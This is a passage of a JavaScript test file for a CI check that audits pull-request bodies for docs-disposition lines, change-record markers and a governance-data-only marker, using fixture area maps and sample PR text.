    assert.deepEqual(docsInScope({ files: ['scripts/gen.js'], map, readFile: noContent }), [
      'docs/alpha.md',
    ]);
  });

  it('a declared-governance file with governed-by [] contributes no docs', () => {
    const map = {
      ...MAP,
      'declared-governance': [{ path: 'scripts/data.json', reason: 'x', 'governed-by': [] }],
    };
    assert.deepEqual(docsInScope({ files: ['scripts/data.json'], map, readFile: noContent }), []);
  });
});

describe('expectedDispositionLines', () => {
  it('emits one doc-level line plus one per judgment-only clause', () => {
    assert.deepEqual(
      expectedDispositionLines({ docs: ['docs/alpha.md', 'docs/tooling.md'], registry: REGISTRY }),
      [
        { doc: 'docs/alpha.md', clause: null },
        { doc: 'docs/alpha.md', clause: 'AL-1' },
        { doc: 'docs/alpha.md', clause: 'AL-3' },
        { doc: 'docs/tooling.md', clause: null },
      ],
    );
  });
});

describe('stripHtmlComments', () => {
  it('removes single-line, multi-line, and unterminated comments', () => {
    const text = 'keep\n<!-- gone -->\n<!-- multi\nline\ngone -->\nkeep2\n<!-- open forever\ngone';
    assert.equal(stripHtmlComments(text), 'keep\n\n\nkeep2\n');
  });
});

describe('parseDispositionSection', () => {
  it('parses verbs, docs, clause anchors, and text — markdown prefixes tolerated', () => {
    const { lines, malformed } = parseDispositionSection(
      [
        'unaffected: docs/alpha.md — nothing here changes capture',
        '- updated: docs/tooling.md — documented the new check',
        '1. unaffected: docs/alpha.md §AL-1 — comment-only change',
        '> unaffected: docs/alpha.md §AL-3 — quoted but real',
        '**updated:** docs/hub.md — bold verb normalized',
        'unaffected: `docs/beta.md` — backticks stripped',
        'Some prose the author left in.',
      ].join('\n'),
    );
    assert.equal(malformed.length, 0);
    assert.deepEqual(
      lines.map((l) => [l.verb, l.doc, l.clause]),
      [
        ['unaffected', 'docs/alpha.md', null],
        ['updated', 'docs/tooling.md', null],
        ['unaffected', 'docs/alpha.md', 'AL-1'],
        ['unaffected', 'docs/alpha.md', 'AL-3'],
        ['updated', 'docs/hub.md', null],
        ['unaffected', 'docs/beta.md', null],
      ],
    );
  });

  it('collects lines that try to be dispositions but do not parse', () => {
    const { lines, malformed } = parseDispositionSection('updated docs/alpha.md missing colon\n');
    assert.deepEqual(lines, []);
    assert.deepEqual(malformed, ['updated docs/alpha.md missing colon']);
  });
});

describe('isGovernanceDataDiff — the class the single recorded line belongs to', () => {
  it('admits the area map alone and the map with the clause registry', () => {
    assert.equal(isGovernanceDataDiff([MAP_PATH]), true);
    assert.equal(isGovernanceDataDiff([MAP_PATH, REGISTRY_PATH]), true);
  });

  it('leaves a registry-only diff outside — its per-doc wall is empty, so there is nothing to replace', () => {
    assert.equal(isGovernanceDataDiff([REGISTRY_PATH]), false);
  });

  it('rejects a diff that carries anything else, and an empty file list', () => {
    assert.equal(isGovernanceDataDiff([MAP_PATH, 'scripts/check-area-map.js']), false);
    assert.equal(isGovernanceDataDiff([]), false);
  });
});

describe('parseGovernanceSection', () => {
  it('reads the marker line, markdown prefixes and a bold verb tolerated', () => {
    const { reasons, malformed } = parseGovernanceSection(
      [
        `- ${GOVERNANCE_MARKER} the map still resolves every tracked file`,
        '**governance-data-only:** a second one, bold',
        'Some prose the author left in.',
      ].join('\n'),
    );
    assert.deepEqual(reasons, ['the map still resolves every tracked file', 'a second one, bold']);
    assert.deepEqual(malformed, []);
  });

  it('reports a near-miss spelling or an empty reason as an attempt, not as prose', () => {
    const { reasons, malformed } = parseGovernanceSection(
      ['governance-data: reason', 'Governance-data-only: capitalised', GOVERNANCE_MARKER].join(
        '\n',
      ),
    );
    assert.deepEqual(reasons, []);
    assert.equal(malformed.length, 3);
  });

  it('tolerates prose that opens with the word "Governance" — it is not an attempt', () => {
    // The attempt matcher is anchored on the hyphenated stem precisely so a
    // disposition section may say this in prose without reddening the PR.
    const { reasons, malformed } = parseGovernanceSection(
      [
        'Governance data is untouched by this change.',
        'Governance of the area map is unchanged.',
      ].join('\n'),
    );
    assert.deepEqual(reasons, []);
    assert.deepEqual(malformed, []);
  });
});

describe('auditBody — the governance-data-only record', () => {
  const record = [
    '',
    '## Change record',
    '',
    'Intent: test.',
    'Outside knowledge: none.',
    'mutation: no per-change claim; mutation testing runs as a standing weekly job.',
  ].join('\n');
  const withDisposition = (lines) => ['## Docs disposition', '', ...lines, record].join('\n');
  const goodLine = `${GOVERNANCE_MARKER} the map still names a governing doc set for every file it moved`;

  it('passes a qualifying diff carrying exactly the one line', () => {
    const r = auditBody({
      body: withDisposition([goodLine]),
      expected: [],
      governanceData: true,
    });
    assert.deepEqual(Object.values(r).flat(), []);
  });

  it('reds a qualifying diff whose section omits the line — and teaches it', () => {
    const r = auditBody({ body: withDisposition(['']), expected: [], governanceData: true });
    assert.deepEqual(r.governanceProblems, [`no "${GOVERNANCE_MARKER}" line`]);
  });

  it('reds a qualifying diff that writes the per-doc wall instead', () => {
    const r = auditBody({
      body: withDisposition(['unaffected: docs/guides/ci.md — no gate changed']),
      expected: [],
      governanceData: true,
    });
    assert.deepEqual(r.unexpected, ['docs/guides/ci.md']);
    assert.deepEqual(r.governanceProblems, [`no "${GOVERNANCE_MARKER}" line`]);
  });

  it('reds more than one line — the section carries exactly one', () => {
    const r = auditBody({
      body: withDisposition([goodLine, `${GOVERNANCE_MARKER} and another reason`]),
      expected: [],
      governanceData: true,
    });
    assert.equal(r.governanceProblems.length, 1);
    assert.match(r.governanceProblems[0], /exactly one/);
  });

  it('reds the line as unearned on a diff outside the class — a registry-only diff included', () => {
    // A registry-only diff keeps the sections exactly as before this class
    // existed: an empty per-doc wall, and the marker line unearned.
    const r = auditBody({ body: withDisposition([goodLine]), expected: [] });
    assert.equal(r.governanceProblems.length, 1);
    assert.match(r.governanceProblems[0], /outside the governance-data-only class/);
    // And with a wall of its own, the per-doc lines are still what is owed.
    const withWall = auditBody({
      body: withDisposition([goodLine]),
      expected: [{ doc: 'docs/guides/ci.md', clause: null }],
    });
    assert.deepEqual(withWall.missing, ['docs/guides/ci.md']);
    assert.equal(withWall.governanceProblems.length, 1);
  });

  it('passes a registry-only diff carrying neither per-doc lines nor the marker', () => {
    // The green half of the case above: the area map declares the registry
    // governed by no doc, so a registry-only diff owes no per-doc lines — and
    // being outside the class, it owes no marker either. Its section is empty
    // and both required sections are present, which is a pass.
    const realMap = JSON.parse(
      readFileSync(path.resolve(import.meta.dirname, '../../../..', MAP_PATH), 'utf8'),
    );
    assert.equal(isGovernanceDataDiff([REGISTRY_PATH]), false);
    assert.deepEqual(
      docsInScope({ files: [REGISTRY_PATH], map: realMap, readFile: noContent }),
      [],
    );
    const r = auditBody({ body: withDisposition(['']), expected: [] });
    assert.deepEqual(Object.values(r).flat(), []);
  });

  it('reds an empty reason and a near-miss spelling as malformed', () => {
    const empty = auditBody({
      body: withDisposition([GOVERNANCE_MARKER]),
      expected: [],
      governanceData: true,
    });
    assert.deepEqual(empty.malformed, [GOVERNANCE_MARKER]);
    assert.deepEqual(empty.governanceProblems, [`no "${GOVERNANCE_MARKER}" line`]);
    const nearMiss = auditBody({
      body: withDisposition(['governance-data-only the map still resolves everything']),
      expected: [],
      governanceData: true,
    });
    assert.equal(nearMiss.malformed.length, 1);
  });

  it('still requires the change record, and the section itself', () => {
    const noRecord = auditBody({
      body: ['## Docs disposition', '', goodLine].join('\n'),
      expected: [],
      governanceData: true,
    });
    assert.deepEqual(noRecord.missingSections, ['## Change record']);
    const noSections = auditBody({
      body: 'just a description',
      expected: [],
      governanceData: true,
    });
    assert.deepEqual(noSections.missingSections, ['## Docs disposition', '## Change record']);
    assert.deepEqual(noSections.governanceProblems, [`no "${GOVERNANCE_MARKER}" line`]);
  });
});

describe('run() governance-data-only class — the recorded line end to end', () => {
  // Shape-valid (the check compiles the map before resolving scope), with one
  // area owning a tree none of these files sit in — so the scope the non-class
  // case computes stays the edited repo-wide README line alone.
  const fixtureMap = (description) =>
    JSON.stringify({
      description,
      'repo-wide': { description: 'x', docs: ['README.md'] },
      areas: { unrelated: { code: ['packages/unrelated/**'], docs: ['docs/unrelated.md'] } },
      unassigned: [],
      'declared-governance': [],
      'governance-partitions': [],
    });

  const REGISTRY_FIXTURE = JSON.stringify({
    description: 'fixture registry',
    prefixes: {},
    retired: {},
    clauses: [],
  });

  const before = {
    'README.md': 'a repo-wide doc\n',
    [MAP_PATH]: fixtureMap('fixture map'),
    [REGISTRY_PATH]: REGISTRY_FIXTURE,
  };

  const body = (dispositionLines) =>
    [
      '## Docs disposition',
      '',
      ...dispositionLines,
      '',
      '## Change record',
      '',
      'Intent: test.',
      'Outside knowledge: none.',
      'mutation: no per-change claim; mutation testing runs as a standing weekly job.',
    ].join('\n');

  const markerLine = `${GOVERNANCE_MARKER} every tracked file still resolves to a governing doc set`;

  it('exits 0 on a map-only diff carrying the single marker line, naming the class', () => {
    const r = runCheckOnChange(
      before,
      { [MAP_PATH]: fixtureMap('fixture map, edited') },
      {
        PR_BODY: body([markerLine]),
      },
    );
    assert.equal(
      r.status,
      0,
      `expected the map-only diff to pass on the marker line (exit 0), got exit ${r.status}.\n` +
        `stdout: ${r.stdout}\nstderr: ${r.stderr}`,
    );
    assert.match(r.stdout, /governance-data-only/);
  });

  it('exits 1 when the marker line rides a diff outside the class', () => {
    const r = runCheckOnChange(
      before,
      { 'README.md': 'an edited repo-wide doc\n' },
      {
        PR_BODY: body([markerLine]),
      },
    );
    assert.equal(
      r.status,
      1,
      `expected the unearned marker line to red (exit 1), got exit ${r.status}.\n` +
        `stdout: ${r.stdout}\nstderr: ${r.stderr}`,
    );
    assert.match(r.stderr, /outside the governance-data-only class/);
  });
});

describe('run() on a malformed area map — the red is the refusal, on the ordinary red path', () => {
  // The check reads the map to derive scope, so a map that is not shape-valid is
  // breakage on its own input. The red names that surface and enumerates what is
  // wrong with it — the same posture the class tests above pin: the red is the
  // verdict itself, not a crash on the way to it.
  const REGISTRY_FIXTURE = JSON.stringify({
    description: 'fixture registry',
    prefixes: {},
    retired: {},
    clauses: [],
  });

  /** Shape-invalid: `areas` is empty, and the partitions are a bare-string list. */
  const malformedMap = JSON.stringify({
    description: 'fixture map',
    'repo-wide': { description: 'x', docs: ['README.md'] },
    areas: {},
    unassigned: [],
    'declared-governance': [],
    'governance-partitions': ['packages/alpha/**'],
  });

  it('exits non-zero naming the map and its shape errors, with no stack trace', () => {
    const r = runCheckOnChange(
      {
        'README.md': 'a repo-wide doc\n',
        [MAP_PATH]: malformedMap,
        [REGISTRY_PATH]: REGISTRY_FIXTURE,
      },
      { 'README.md': 'an edited repo-wide doc\n' },
      {
        PR_BODY: [
          '## Docs disposition',
          '',
          'unaffected: README.md — nothing here touches it',
          '',
          '## Change record',
          '',
          'Intent: test.',
          'Outside knowledge: none.',
          'mutation: no per-change claim; mutation testing runs as a standing weekly job.',
        ].join('\n'),
      },
    );
    assert.equal(
      r.status,
      1,
      `expected the malformed map to red (exit 1), got exit ${r.status}.\n` +
        `stdout: ${r.stdout}\nstderr: ${r.stderr}`,
    );
    assert.match(r.stderr, new RegExp(`${MAP_PATH.replace('.', '\\.')} is malformed`));
    assert.match(r.stderr, /"areas" must be a non-empty object/);
    assert.doesNotMatch(r.stderr, /^\s+at /m); // a verdict, not a thrown stack
  });
});

describe('extractSection', () => {
  const body = '# T\n\n## Docs disposition\n\nline1\n\n## Change record\n\nIntent: x\n';

  it('extracts a section up to the next heading, case-insensitively', () => {
    assert.match(extractSection(body, 'Docs disposition'), /line1/);
    assert.doesNotMatch(extractSection(body, 'docs disposition'), /Intent:/);
    assert.match(extractSection(body, 'Change record'), /Intent: x/);
  });

  it('returns null for an absent section', () => {
    assert.equal(extractSection(body, 'Motivation'), null);
  });
});

describe('auditBody', () => {
  const expected = [
    { doc: 'docs/alpha.md', clause: null },
    { doc: 'docs/alpha.md', clause: 'AL-1' },
  ];
  const goodBody = [
    '## Docs disposition',
    '',
    'unaffected: docs/alpha.md — no capture change',
    'unaffected: docs/alpha.md §AL-1 — comment-only',
    '',
    '## Change record',
    '',
    'Intent: test.',
    'Outside knowledge: none.',
    'mutation: no per-change claim; mutation testing runs as a standing weekly job.',
  ].join('\n');

  it('passes a complete body — also with CRLF line endings', () => {
    assert.deepEqual(Object.values(auditBody({ body: goodBody, expected })).flat(), []);
    const crlf = goodBody.replace(/\n/g, '\r\n');
    assert.deepEqual(Object.values(auditBody({ body: crlf, expected })).flat(), []);
  });

  it('reports a missing expected line by its exact anchor', () => {
    const r = auditBody({
      body: goodBody.replace(/unaffected: docs\/alpha\.md §AL-1.*\n/, ''),
      expected,
    });
    assert.deepEqual(r.missing, ['docs/alpha.md §AL-1']);
  });

  it('reports out-of-scope and duplicate lines', () => {
    const noisy = goodBody.replace(
      '## Change record',
      'updated: docs/other.md — not in scope\nunaffected: docs/alpha.md — again\n\n## Change record',
    );
    const r = auditBody({ body: noisy, expected });
    assert.deepEqual(r.unexpected, ['docs/other.md']);
    assert.deepEqual(r.duplicates, ['docs/alpha.md']);
  });

  it('reports both sections when the body has neither', () => {
    const r = auditBody({ body: 'just a description', expected });
    assert.deepEqual(r.missingSections, ['## Docs disposition', '## Change record']);
    assert.deepEqual(r.missing, ['docs/alpha.md', 'docs/alpha.md §AL-1']);
  });

  it('reports missing change-record markers', () => {
    const r = auditBody({
      body: goodBody.replace('Outside knowledge: none.\n', '').replace(/mutation:.*\n?/, ''),
      expected,
    });
    assert.deepEqual(r.changeRecordProblems, [
      'change record has no "Outside knowledge:" line',
      'change record has no "mutation:" line',
    ]);
  });

  it('ignores disposition lines and markers hidden inside HTML comments — both directions', () => {
    // A clause line present only inside a comment must NOT count as present…
    const hidden = goodBody.replace(
      'unaffected: docs/alpha.md §AL-1 — comment-only',
      '<!-- unaffected: docs/alpha.md §AL-1 — invisible in the rendered PR -->',
    );
    assert.deepEqual(auditBody({ body: hidden, expected }).missing, ['docs/alpha.md §AL-1']);

    // …and markers that exist only in the template's comment must not satisfy.
    const emptyRecord = goodBody.replace(
      /Intent: test\.[\s\S]*$/,
      '<!-- Intent: <one sentence>\n Outside knowledge: <or "none">\n mutation: say so. -->\n',
    );
    const r = auditBody({ body: emptyRecord, expected });
    assert.equal(r.changeRecordProblems.length, 3);
  });

  it('requires markers at a line start — a marker quoted mid-prose does not satisfy', () => {
    const midProse = goodBody.replace(
      'Intent: test.',
      'This paragraph mentions the word Intent: casually.',
    );
    const r = auditBody({ body: midProse, expected });
    assert.deepEqual(r.changeRecordProblems, ['change record has no "Intent:" line']);
  });

  it('rejects the shipped PR template as-is (comments are inert, sections are empty)', () => {
    const template = readFileSync(
      path.resolve(import.meta.dirname, '../../../../.github/PULL_REQUEST_TEMPLATE.md'),
      'utf8',
    );
    const r = auditBody({ body: template, expected });
    assert.deepEqual(r.unexpected, []); // nothing inside comments leaks in
    assert.deepEqual(r.missing, ['docs/alpha.md', 'docs/alpha.md §AL-1']);
    assert.equal(r.changeRecordProblems.length, 3);
  });
});
